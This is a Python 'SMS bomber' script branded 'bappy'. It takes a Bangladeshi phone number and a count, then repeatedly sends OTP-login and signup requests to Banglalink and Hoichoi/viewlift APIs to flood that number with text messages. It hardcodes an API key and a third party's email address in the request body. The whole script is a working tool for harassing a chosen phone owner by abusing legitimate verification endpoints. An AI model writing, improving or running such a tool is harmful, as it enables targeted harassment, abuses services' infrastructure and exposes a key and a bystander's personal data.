print('code copy by root of cyber=roc-x')
import os
import requests
import time
from requests.structures import CaseInsensitiveDict



#CVALUE
blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'

line=yellow+"code copy by root of cyber*roc-x"
line=yellow+"***************************************************************"
space=" "
logo=green+str("""
          
 | |
 | |__   __ _ _ __  _ __  _   _
 | '_ \ / _` | '_ \| '_ \| | | |
 | |_) | (_| | |_) | |_) | |_| |
 |_.__/ \__,_| .__/| .__/ \__, |
             | |   | |     __/ |
             |_|   |_|    |___/                                               
""")

      
 #HEADER                
text=cyan+"\t\tDeveloped By : roc-x code copy "+red+"\n\n\t\t👿👿 bappy BD SMS Bomber 👿👿   \n" 
notice=""     
def header():
	print(logo)
	print(text)
	print(line)
	print(notice)
#SELECT_MAIN
def opt():
	print(cyan+"\n==> Select Your Option From Below")
	print(white+"\n\n [1] bappy  SMS Bombing")
#MAIN_TOOL
os.system('clear')
tt=1
header()	
opt()
while tt<2:
	opt2=str(input(blue+"\n\n [>] Enter the number of option : "+green))
	if opt2=="1":
		text=cyan+"\t\tDeveloped By : bappy chowdowry"+blue+"\n\n\t\t👿👿bappy  SMS Bomber 👿👿   \n" 
		os.system('clear')
		header()
		number=str(input(red+"\n\n [>] Enter The BD Number : "+white))
		ammount=int(input(green+"\n [>] Enter The Ammount : "+yellow))
		os.system('clear')
		notice=cyan+"\n\t   [•] bappy Tools in progress......\n\n"
		header()
		ammount2=1
		totalsent=0
		totalnotsent=0
		while ammount2<ammount+1:
			try:
				if "yyy" in number or "yyy" in number:
					r=requests.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request",data={"mobile":number})
						
				else:
					url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
					headers = CaseInsensitiveDict()
					headers["Host"] = "prod-api.viewlift.com"
					headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0"
					headers["Accept"] = "application/json, text/plain, */*"
					headers["Accept-Language"] = "en-US,en;q=0.5"
					headers["Accept-Encoding"] = "gzip, deflate, br"
					headers["Content-Type"] = "application/json"
					headers["Content-Length"] = "128"
					headers["x-api-key"] = "dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3"
					headers["Origin"] = "https://www.hoichoi.tv"
					headers["Referer"] = "https://www.hoichoi.tv/"
					headers["Connection"] = "keep-alive"
					data = """{\"requestType\":\"send\",\"phoneNumber\":\"+88"""+number+"""\",\"emailConsent\":true,\"whatsappConsent\":true,\"email\":\"sanaur.asif@gmail.com\"}"""
					r= requests.post(url, headers=headers, data=data)
												
				if ammount2==1:
					print(cyan+"\n\t  👿👿bappy👿👿�=>   "+white+"[✓] 1st SMS Sent.")
				elif ammount2==2:
					print(cyan+"\n\t  👿👿bappy👿👿�=>   "+white+"[✓] 2nd SMS Sent.")
				elif ammount2==3:
					print(cyan+"\n\t  👿👿bappy👿👿�=>   "+white+"[✓] 3rd SMS Sent.")
				else:
					print(cyan+"\n\t  👿👿bappy👿👿==>   "+white+"[✓] "+str(ammount2)+"th SMS Sent.")
				time.sleep(1)
				totalsent+=1
				ammount2+=1
			except:
				if ammount2==1:
					print(cyan+"\n\t  👿👿bappy👿👿==>   "+green+"[×] 1st SMS Not Sent.")
				elif ammount2==2:
					print(cyan+"\n\t  😈😈bappy�=>   "+blue+"[×] 2nd SMS Not Sent.")
				elif ammount2==3:
					print(cyan+"\n\t  👿👿bappy👿👿==>   "+green+"[×] 3rd SMS Not Sent.")
				else:
					print(cyan+"\n\t  😈😈bappy🐽��=>   "+white+"[×] "+str(ammount2)+"th SMS Not Sent.")
					time.sleep(10)
					ammount2+=1
									
								
		totalhit=ammount2-1
		totalnotsent=totalhit-totalsent
		print(cyan+"\n\n\t\t[•] Total Hits : "+yellow+str(totalhit))
		print(green+"\n\t\t[✓] Total Sent : "+yellow+str(totalsent))
		print(red+"\n\t\t[×] Total Not Sent : "+yellow+str(totalnotsent)+"\n")
		lastt=str(input(cyan+"\n\n\t\t  [✓] All Done!\n\t [•] Now Press Enter Key To Continue\n"))
		os.system('clear')
		notice=""
		text=green+"\n\n\t\t😈😈bappysms Tools👿👿   \n" 
		header()
		opt()
	
			
	elif opt2=="3":
		os.system("python3 main2.py")
	else:
		text=cyan+"\t\tDeveloped By : bappy"+green+"\n\n\t\t👿👿 bappy  SMS Bomber 👿👿  \n" 
		notice=red+"\n\t\t[×] Wrong Value Entered"
		os.system('clear')
		header()
		opt()
		continue